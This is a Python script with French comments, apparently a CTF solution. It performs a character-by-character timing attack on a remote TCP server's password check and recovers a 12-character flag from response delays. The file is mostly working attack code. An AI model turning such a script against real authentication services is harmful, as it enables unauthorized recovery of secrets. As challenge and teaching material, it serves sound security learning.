# Script implémentant une timing attack simplifiée sur un serveur TCP distant
# Le serveur semble mettre strictement 0.5 secondes par caractère à vérifier d'après quelques tests préalables
# Il suffit donc de tenter tous les caractères possibles et de vérifier le temps d'exécution
# Si cela prend plus de 0.5 secondes c'est que le caractère était correct et que la fonction de vérification est passée au suivant

# Il a déjà été démontré que la connexion Internet n'avait quasiment aucune influence pour ce type d'attaque :
# 	=> "Opportunities and Limits of Remote Timing Attacks" - Scott A. CROSBY, Dan S. WALLACH and Rudolf H. RIEDI
# 	=> https://dl.acm.org/doi/10.1145/1455526.1455530

import time, socket, string

####################################################################################################
# Cette fonction effectue le test pour un seul caractère et retourne le temps consommé
# "sendall()" est une version plus fiabilisée de "send()"

def test_timing_caractere(connexion, texte):
	start = time.time()
	connexion.sendall(texte) 
	print(connexion.recv(1024))
	end = time.time()
	return (end - start)
####################################################################################################

### VARIABLES ######################################################################################
caracteres = string.printable # Liste des caractères affichables et utilisables dans un mot de passe
host = ("URL", 12345) # Tuple contenant l'adresse et le port du serveur
connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket classique
longueur = 12 # La longueur de la clé est définie à 12 dans le challenge
key = ""

####################################################################################################

connexion.connect(host)
print(connexion.recv(1024))

for i in range(longueur):
	duree_actuelle = 0.5 * len(key) + 0.5
	for x in caracteres:
		if test_timing_caractere(connexion, str(key+x).encode()) >= duree_actuelle:
			key += x
			break

print("Flag : ", key) 
